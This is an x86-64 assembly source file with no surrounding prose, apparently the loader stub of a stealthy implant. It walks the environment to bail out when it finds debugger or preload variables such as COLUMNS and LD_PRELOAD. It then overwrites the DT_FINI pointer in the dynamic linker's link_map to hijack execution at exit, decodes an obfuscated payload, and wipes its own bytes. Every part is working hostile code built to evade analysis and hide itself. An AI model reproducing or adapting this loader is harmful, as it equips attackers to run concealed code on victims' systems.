.equ PAYLOAD_SIZE_IN_WORDS, 0

.macro movqq a, b
    push \b
    pop \a
.endm

_begin:
    lea rdx, [rip+_begin-24]
    mov rdi, [rdx] /* &_dl_argv */

    // Optimized (for size) loop for skipping argv
    movqq rcx, rdi
    xor eax, eax
    repnz scasq

    // Check for environment variable "LINES", "COLUMNS", "LD_PRELOAD" and "LD_AUDIT".
    // To make it tight we use an approximation: just check the first 4 characters.
    movqq rsi, rdi
env_check_loop:
    lodsq
    test eax, eax
    jz env_check_okay
    mov eax, dword ptr [rax]
    ror eax, 1
    cmp eax, 0xaaa627a1 /* "COLU" */
    jz bye
    // It should be enough to check "COLU" only: gdb sets the two at the same time.
    // cmp eax, 0x22a724a6 /* "LINE" */
    // jz bye
    // hex(ror(u32(b"LD_P"), 1, 32) & 0xffff). there might be false positive but
    // we don't care as long as there aren't in prod.
    cmp ax, 0xa226
    jz bye
    jmp env_check_loop

env_check_okay:
    // Overwrite dl_info[DT_FINI] in link_map
    mov rdi, [rdx+8]
    mov rax, [rdx+16]
    stosq

    // Decode payload
    movqq rcx, PAYLOAD_SIZE_IN_WORDS
    // lea rdi, [rdx+(_end-_begin)+24] GNU AS outputs 488dba6d000000, why ._.
    .byte 0x48, 0x8d, 0x7a, (_end-_begin)+24
    xor eax, eax
decode_loop:
    xor [rdi+rcx*4], eax
    add eax, [rdi+rcx*4]
    loop decode_loop

bye:
    // Zeroing self
    movqq rdi, rdx
    // GNU AS (2.40) is too stupid: it assembles "push _fin-_begin+24" into a 0x68 (4 byte push) instead of single byte one.
    .byte 0x6A
    .byte _fin-_begin+24
    pop rcx
    xor eax, eax
    rep stosb
    _fin:
    // HACK: save 1 byte by embedding a retn insn at the beginning of payload and fall-through to payload
    // ret 
_end:
